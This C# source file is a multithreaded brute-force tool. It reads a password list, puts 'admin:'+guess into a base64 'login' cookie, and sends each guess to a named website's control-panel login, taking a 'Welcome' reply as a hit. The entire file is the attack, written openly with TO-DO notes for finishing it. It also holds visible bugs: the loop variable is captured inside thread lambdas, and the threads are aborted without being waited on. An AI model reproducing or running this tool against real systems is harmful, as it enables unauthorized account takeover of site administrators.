using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Http;
using System.Net;
using System.Collections.Specialized;
using System.IO;


/* TO DO:
 * 1- In method CheckPass send alter if correct pass founded
 * 2- In method Main Wait for threads alter
 */
  
namespace BruteForce
{
    class Program
    {
        static List<string> passList = new List<string>();
        static string user = "admin";
        static string password;
        static int range;

        static void Main(string[] args)
        {
            string pass = "";
            int numThreads = 100;
            Thread[] threads = new Thread[numThreads];

            StreamReader file = new StreamReader("c:\\passList.txt");
            while ((pass = file.ReadLine()) != null)
                passList.Add(pass);
            file.Close();

            range = passList.Count / numThreads;

            for (int i= 0; i < numThreads; i++)
            {
                ThreadStart start = new ThreadStart(() => CheckPass(i));
                threads[i] = new Thread(start);
                threads[i].Start();

            }

            //2- Wait for alter

            foreach (Thread thread in threads)
                thread.Abort();


            Console.WriteLine("\n\nPassword is: " + password);

            Console.Read();
        }

        public static void CheckPass(int pointer)
        {
            int end = ((1 + pointer) * range > passList.Count) ? passList.Count : (1 + pointer) * range;

            for(int i=pointer*range; i<end; i++)
            {
                string pass = passList[i];
                string encoded = Connect(Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + pass)));
                if (encoded.Contains("Welcome"))
                {
                    password = pass;
                    //1- send alter if correct pass founded and stop thread
                    
                    break;
                }
                Console.WriteLine(pass);
            }

        }
        public static string Connect(string cookieValue)
        {
            string url = @"http://www.dark0day.com/cp/index.php?do=login";
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.CookieContainer = new CookieContainer();
            Cookie cookie = new Cookie("login", cookieValue);
            request.CookieContainer.Add(new Uri(url), cookie);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            var encoding = ASCIIEncoding.ASCII;
            StreamReader reader = new StreamReader(response.GetResponseStream());

            return reader.ReadToEnd();
        }
    }
}
